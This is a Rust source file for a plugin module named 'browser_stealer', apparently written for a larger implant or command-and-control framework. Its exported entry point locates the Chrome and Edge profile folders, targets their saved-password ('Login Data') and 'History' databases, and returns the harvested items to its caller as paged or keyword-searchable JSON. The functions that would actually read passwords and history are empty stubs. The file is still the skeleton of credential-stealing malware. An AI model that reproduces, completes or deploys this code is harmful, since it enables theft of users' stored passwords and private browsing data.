//!
//!   collect: { total, offset, limit, items: [...] }
//!   search:  { total, items: [...] }
//!
//!   module_name() -> *const u8
//!   module_main(input, input_len, output, output_cap) -> usize

use serde_json::json;

#[no_mangle]
pub extern "C" fn module_name() -> *const u8 {
    concat!("browser_stealer", "\0").as_ptr() as *const u8
}

#[no_mangle]
pub unsafe extern "system" fn module_main(
    input: *const u8,
    input_len: usize,
    output: *mut u8,
    output_cap: usize,
) -> usize {
    let input_json = if input.is_null() || input_len == 0 {
        "{}".to_string()
    } else {
        String::from_utf8_lossy(std::slice::from_raw_parts(input, input_len)).to_string()
    };

    let v: serde_json::Value = serde_json::from_str(&input_json).unwrap_or_else(|_| json!({}));
    let op = v.get("op").and_then(|o| o.as_str()).unwrap_or("collect");
    let btype = v.get("type").and_then(|t| t.as_str()).unwrap_or("all");
    let offset = v.get("offset").and_then(|o| o.as_u64()).unwrap_or(0) as usize;
    let limit = v.get("limit").and_then(|l| l.as_u64()).unwrap_or(250) as usize;
    let keyword = v.get("keyword").and_then(|k| k.as_str()).unwrap_or("");

    let result = if op == "search" {
        collect(btype, true, keyword, 0, 0)
    } else {
        collect(btype, false, "", offset, limit)
    };
    write_output(&result, output, output_cap)
}

fn collect(browser_type: &str, search: bool, keyword: &str, offset: usize, limit: usize) -> String {
    let browsers: &[(&str, &str)] = match browser_type {
        "chrome" => &[("Chrome", r"Google\Chrome\User Data")],
        "edge" => &[("Edge", r"Microsoft\Edge\User Data")],
        _ => &[
            ("Chrome", r"Google\Chrome\User Data"),
            ("Edge", r"Microsoft\Edge\User Data"),
        ],
    };

    let local_appdata = local_appdata();
    let mut all_items: Vec<String> = Vec::new();

    for (name, rel_path) in browsers {
        let user_data = format!(r"{}\{}", local_appdata, rel_path);
        let p = std::path::Path::new(&user_data);
        if !p.exists() {
            continue;
        }

        let login_db = p.join("Default").join("Login Data");
        if login_db.exists() {
            let items = read_passwords(name, &login_db);
            for it in items {
                if !search || matches_keyword(&it, keyword) {
                    all_items.push(it);
                }
            }
        }

        let hist_db = p.join("Default").join("History");
        if hist_db.exists() {
            let items = read_history(name, &hist_db);
            for it in items {
                if !search || matches_keyword(&it, keyword) {
                    all_items.push(it);
                }
            }
        }
    }

    if search {
        format!(
            r#"{{"total":{},"items":[{}]}}"#,
            all_items.len(),
            all_items.join(",")
        )
    } else {
        let total = all_items.len();
        let page: Vec<_> = all_items
            .into_iter()
            .skip(offset)
            .take(if limit == 0 { 250 } else { limit })
            .collect();
        format!(
            r#"{{"total":{},"offset":{},"limit":{},"items":[{}]}}"#,
            total,
            offset,
            limit,
            page.join(",")
        )
    }
}

fn read_passwords(_browser: &str, _db: &std::path::Path) -> Vec<String> {
    Vec::new()
}

fn read_history(browser: &str, db: &std::path::Path) -> Vec<String> {
    let _ = (browser, db);
    Vec::new()
}

fn matches_keyword(item: &str, keyword: &str) -> bool {
    item.to_lowercase().contains(&keyword.to_lowercase())
}

fn local_appdata() -> String {
    std::env::var("LOCALAPPDATA").unwrap_or_else(|_| {
        let home = std::env::var("USERPROFILE").unwrap_or_default();
        format!(r"{}\AppData\Local", home)
    })
}

fn write_output(s: &str, output: *mut u8, output_cap: usize) -> usize {
    let bytes = s.as_bytes();
    let n = bytes.len().min(output_cap);
    if n > 0 && !output.is_null() {
        unsafe {
            std::ptr::copy_nonoverlapping(bytes.as_ptr(), output, n);
        }
    }
    n
}
